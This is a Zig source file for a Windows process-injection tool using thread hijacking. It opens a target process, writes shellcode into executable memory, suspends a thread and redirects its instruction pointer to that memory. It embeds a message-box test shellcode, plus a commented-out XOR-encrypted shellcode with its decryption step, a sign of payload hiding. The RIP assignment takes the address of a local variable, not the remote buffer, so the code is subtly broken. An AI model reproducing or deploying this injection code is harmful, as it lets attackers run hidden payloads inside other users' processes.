const std = @import("std");
const lib = @import("lib");
const win = @import("win");
const logger = @import("logger");

// pub const cipherShellcode: []const u8 = &.{ 0x9f, 0x81, 0xe3, 0x6f, 0x63, 0x69, 0x01, 0xe6, 0x86, 0x58, 0xa1, 0x0b, 0xe8, 0x39, 0x51, 0xe4, 0x31, 0x65, 0xea, 0x3d, 0x77, 0xe2, 0x13, 0x47, 0x6c, 0xde, 0x2b, 0x49, 0x52, 0x96, 0xcd, 0x53, 0x02, 0x15, 0x63, 0x43, 0x43, 0xa8, 0xae, 0x62, 0x62, 0xae, 0x83, 0x9d, 0x31, 0x3e, 0xea, 0x3d, 0x73, 0xe2, 0x2b, 0x53, 0xe8, 0x25, 0x70, 0x17, 0x80, 0x21, 0x60, 0xbe, 0x32, 0xe2, 0x38, 0x4f, 0x62, 0xba, 0xea, 0x26, 0x7b, 0x8a, 0x5b, 0x26, 0xe8, 0x5d, 0xea, 0x6e, 0xb5, 0x58, 0x9e, 0xc3, 0xa2, 0xa6, 0x6c, 0x6e, 0xa4, 0x51, 0x81, 0x1a, 0x95, 0x6a, 0x1c, 0x97, 0x58, 0x14, 0x45, 0x1a, 0x87, 0x31, 0xea, 0x37, 0x47, 0x68, 0xb2, 0x09, 0xe8, 0x65, 0x2a, 0xe4, 0x3b, 0x75, 0x60, 0xbc, 0xe8, 0x6d, 0xea, 0x6e, 0xb3, 0xe0, 0x25, 0x4b, 0x47, 0x32, 0x3a, 0x0e, 0x3a, 0x33, 0x30, 0x90, 0x83, 0x36, 0x3e, 0x35, 0xe8, 0x7b, 0x8a, 0xe2, 0x3e, 0x01, 0x52, 0x5d, 0x63, 0x69, 0x09, 0x18, 0x10, 0x5b, 0x3e, 0x3b, 0x0b, 0x25, 0x16, 0x49, 0x64, 0x96, 0xb4, 0xd7, 0xf3, 0x68, 0x61, 0x6f, 0x4a, 0xad, 0x35, 0x3f, 0x0b, 0x40, 0xe1, 0x04, 0x63, 0x96, 0xb4, 0x3f, 0x33, 0x39, 0x31, 0x2f, 0x33, 0x29, 0x31, 0x07, 0x89, 0x66, 0xbe, 0x8f, 0x9c, 0xbc, 0xf6, 0x05, 0x66, 0x01, 0xcd, 0x7c, 0xa3, 0xab, 0x09, 0x6d, 0x63, 0x76, 0xf1, 0xe6, 0x85, 0x03, 0x71, 0x39, 0x34, 0x01, 0xf8, 0xca, 0x17, 0x08, 0x9e, 0xba, 0xe6, 0xa9, 0x15, 0x63, 0x9c, 0x27, 0x69, 0x1a, 0x8f, 0x01, 0x91, 0xda, 0xc1, 0x3f, 0x9e, 0xba, 0x0b, 0x0a, 0x0c, 0x0b, 0x63, 0xe0, 0x82, 0x38, 0x34, 0x3e, 0x50, 0x99, 0x09, 0x7b, 0x38, 0x39, 0x81, 0x94, 0x07, 0xa8, 0x27, 0x4d, 0x5d, 0x6e, 0x62, 0xe4, 0x25, 0x4b, 0x73, 0xaf, 0x61, 0x2b, 0x37, 0x39, 0x37, 0x39, 0x35, 0x2f, 0x37, 0x21, 0x35, 0x3f, 0x32, 0x39, 0x0b, 0x10, 0xad, 0x50, 0xe5, 0x96, 0xb4, 0xe6, 0x83, 0x27, 0x37, 0x29, 0x9c, 0x59, 0x09, 0x67, 0xe4, 0x74, 0x01, 0x90, 0xb6, 0xd2, 0x91, 0xda, 0xc1, 0x3f, 0x09, 0xc9, 0xf6, 0xd4, 0xfc, 0x90, 0xb6, 0x55, 0x67, 0x13, 0x69, 0xe9, 0x9a, 0x8f, 0x16, 0x6c, 0xda, 0x28, 0x70, 0x1b, 0x0e, 0x05, 0x63, 0x3a, 0x9e, 0xba };

// Test shellcode with a normale Hello World pop-up
pub const shellcode: []const u8 = &.{ 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x8d, 0x15, 0x66, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x52, 0x00, 0x00, 0x00, 0xe8, 0x9e, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xf8, 0x48, 0x8d, 0x0d, 0x5d, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x8d, 0x15, 0x5f, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x4d, 0x00, 0x00, 0x00, 0xe8, 0x7f, 0x00, 0x00, 0x00, 0x4d, 0x33, 0xc9, 0x4c, 0x8d, 0x05, 0x61, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x4e, 0x00, 0x00, 0x00, 0x48, 0x33, 0xc9, 0xff, 0xd0, 0x48, 0x8d, 0x15, 0x56, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0xe8, 0x56, 0x00, 0x00, 0x00, 0x48, 0x33, 0xc9, 0xff, 0xd0, 0x4b, 0x45, 0x52, 0x4e, 0x45, 0x4c, 0x33, 0x32, 0x2e, 0x44, 0x4c, 0x4c, 0x00, 0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x55, 0x53, 0x45, 0x52, 0x33, 0x32, 0x2e, 0x44, 0x4c, 0x4c, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x41, 0x00, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x00, 0x48, 0x83, 0xec, 0x28, 0x65, 0x4c, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x40, 0x18, 0x4d, 0x8d, 0x60, 0x10, 0x4d, 0x8b, 0x04, 0x24, 0xfc, 0x49, 0x8b, 0x78, 0x60, 0x48, 0x8b, 0xf1, 0xac, 0x84, 0xc0, 0x74, 0x26, 0x8a, 0x27, 0x80, 0xfc, 0x61, 0x7c, 0x03, 0x80, 0xec, 0x20, 0x3a, 0xe0, 0x75, 0x08, 0x48, 0xff, 0xc7, 0x48, 0xff, 0xc7, 0xeb, 0xe5, 0x4d, 0x8b, 0x00, 0x4d, 0x3b, 0xc4, 0x75, 0xd6, 0x48, 0x33, 0xc0, 0xe9, 0xa7, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x58, 0x30, 0x44, 0x8b, 0x4b, 0x3c, 0x4c, 0x03, 0xcb, 0x49, 0x81, 0xc1, 0x88, 0x00, 0x00, 0x00, 0x45, 0x8b, 0x29, 0x4d, 0x85, 0xed, 0x75, 0x08, 0x48, 0x33, 0xc0, 0xe9, 0x85, 0x00, 0x00, 0x00, 0x4e, 0x8d, 0x04, 0x2b, 0x45, 0x8b, 0x71, 0x04, 0x4d, 0x03, 0xf5, 0x41, 0x8b, 0x48, 0x18, 0x45, 0x8b, 0x50, 0x20, 0x4c, 0x03, 0xd3, 0xff, 0xc9, 0x4d, 0x8d, 0x0c, 0x8a, 0x41, 0x8b, 0x39, 0x48, 0x03, 0xfb, 0x48, 0x8b, 0xf2, 0xa6, 0x75, 0x08, 0x8a, 0x06, 0x84, 0xc0, 0x74, 0x09, 0xeb, 0xf5, 0xe2, 0xe6, 0x48, 0x33, 0xc0, 0xeb, 0x4e, 0x45, 0x8b, 0x48, 0x24, 0x4c, 0x03, 0xcb, 0x66, 0x41, 0x8b, 0x0c, 0x49, 0x45, 0x8b, 0x48, 0x1c, 0x4c, 0x03, 0xcb, 0x41, 0x8b, 0x04, 0x89, 0x49, 0x3b, 0xc5, 0x7c, 0x2f, 0x49, 0x3b, 0xc6, 0x73, 0x2a, 0x48, 0x8d, 0x34, 0x18, 0x48, 0x8d, 0x7c, 0x24, 0x30, 0x4c, 0x8b, 0xe7, 0xa4, 0x80, 0x3e, 0x2e, 0x75, 0xfa, 0xa4, 0xc7, 0x07, 0x44, 0x4c, 0x4c, 0x00, 0x49, 0x8b, 0xcc, 0x41, 0xff, 0xd7, 0x49, 0x8b, 0xcc, 0x48, 0x8b, 0xd6, 0xe9, 0x14, 0xff, 0xff, 0xff, 0x48, 0x03, 0xc3, 0x48, 0x83, 0xc4, 0x28, 0xc3 };

pub fn threadHijacking(
    pid: ?u32,
) anyerror!void {
    var targetProcess: ?*anyopaque = undefined;
    var threadEntry: win.THREADENTRY32 = undefined;
    var threadHijacked: ?win.HANDLE = undefined;
    // const allocator: std.mem.Allocator = std.heap.page_allocator;
    var context: win.CONTEXT = std.mem.zeroes(win.CONTEXT);
    context.ContextFlags = win.CONTEXT_FULL;
    threadEntry.dwSize = @sizeOf(win.THREADENTRY32);

    logger.info("Starting thread hijacking...", .{});

    logger.debug("Opening process with PID: {}", .{pid.?});
    targetProcess = win.threads.OpenProcess(win.threads.PROCESS_ALL_ACCESS, win.FALSE, pid.?);
    if (targetProcess == null) {
        logger.err("Failed to handle the process by pid not found or not accesible", .{});
        return;
    }

    // logger.info("Decrypting shellcode...", .{});
    // const shellcode = try lib.xorMultiBytes(allocator, cipherShellcode, "ciao");
    // logger.debug("Start of the deoffuscated shellcode: {x}", .{shellcode[0..3]});

    logger.info("Allocating remote buffer in target process...", .{});
    const remoteBuffer = win.mem.VirtualAllocEx(targetProcess, null, shellcode.len, (win.mem.VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1, .RESERVE = 1 }), win.mem.PAGE_EXECUTE_READWRITE);
    logger.debug("Remote buffer address: {?}", .{remoteBuffer});

    logger.info("Writing shellcode to remote process memory...", .{});
    _ = win.WriteProcessMemory(targetProcess, remoteBuffer, shellcode.ptr, shellcode.len, null);

    logger.info("Searching for thread to hijack...", .{});
    const snapshot = win.CreateToolhelp32Snapshot(win.TH32CS_SNAPTHREAD, 0);

    _ = win.Thread32First(snapshot, &threadEntry);
    while (win.Thread32Next(snapshot, &threadEntry) == win.TRUE) {
        logger.debug("Checking thread with TID: {} and with Owner: {}", .{ threadEntry.th32ThreadID, threadEntry.th32OwnerProcessID });
        if (threadEntry.th32OwnerProcessID == pid) {
            logger.info("Found thread to hijack: {}", .{threadEntry.th32ThreadID});
            threadHijacked = win.threads.OpenThread(win.threads.THREAD_ALL_ACCESS, win.FALSE, threadEntry.th32ThreadID);
            break;
        }
    }

    logger.info("Suspending target thread...", .{});
    const suspend_result = win.threads.SuspendThread(threadHijacked);
    if (suspend_result == 0xFFFFFFFF) {
        logger.err("\t[!] SuspendThread Failed With Error: {d}\n", .{@intFromEnum(win.standard.GetLastError())});
        return;
    }

    logger.info("Getting thread context...", .{});
    if (win.GetThreadContext(threadHijacked, &context) == 0) {
        logger.err("\t[!] GetThreadContext Failed With Error: {d}\n", .{win.standard.GetLastError()});
        return;
    }

    logger.debug("Original RIP: 0x{x}", .{context.Rip});
    context.Rip = @intFromPtr(&remoteBuffer);
    logger.debug("Setting RIP to shellcode address: 0x{x}", .{context.Rip});
    _ = win.SetThreadContext(threadHijacked, &context);

    logger.info("Resuming hijacked thread...", .{});
    _ = win.threads.ResumeThread(threadHijacked);

    logger.info("Thread hijacking completed.", .{});

    return;
}
